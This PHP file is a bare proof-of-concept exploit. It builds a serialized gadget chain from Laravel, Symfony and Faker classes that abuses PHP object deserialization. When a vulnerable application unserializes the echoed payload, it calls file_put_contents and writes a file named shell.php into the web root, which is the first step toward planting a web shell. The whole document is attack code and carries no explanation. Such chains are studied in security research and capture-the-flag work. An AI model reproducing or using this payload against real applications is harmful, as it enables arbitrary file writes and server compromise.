<?php
namespace Illuminate\Broadcasting
{
    class PendingBroadcast{
        protected $events;
        protected $event;
        public function __construct($events,$event){
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Symfony\Component\EventDispatcher\Debug
{
    class TraceableEventDispatcher{
        private $dispatcher;
        public function __construct($dispatch)
        {
            $this->dispatcher = $dispatch;
        }
    }
}

namespace Faker
{
    class Generator{
        protected $providers;
        protected $formatters;
        public function __construct($providers,$formatters){
            $this->providers = $providers;
            $this->formatters = $formatters;
        }
    }
}

namespace Illuminate\Events
{
    class Dispatcher{
        protected $listeners = [];
        public function __construct($listeners){
            $this->listeners = $listeners;
        }
    }
}

namespace
{
$file="/var/www/html/shell.php";
$content = "<?phpinfo();?>";
$function = "file_put_contents";
$dispatch = new Illuminate\Events\Dispatcher(array($file=>$content));
$generator = new Faker\Generator($dispatch,array("hasListeners"=>"pass","getListenerPriority"=>$function));
$traceable = new Symfony\Component\EventDispatcher\Debug\TraceableEventDispatcher($generator);
$pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($traceable,$file);
echo serialize($pendingbroadcast);
}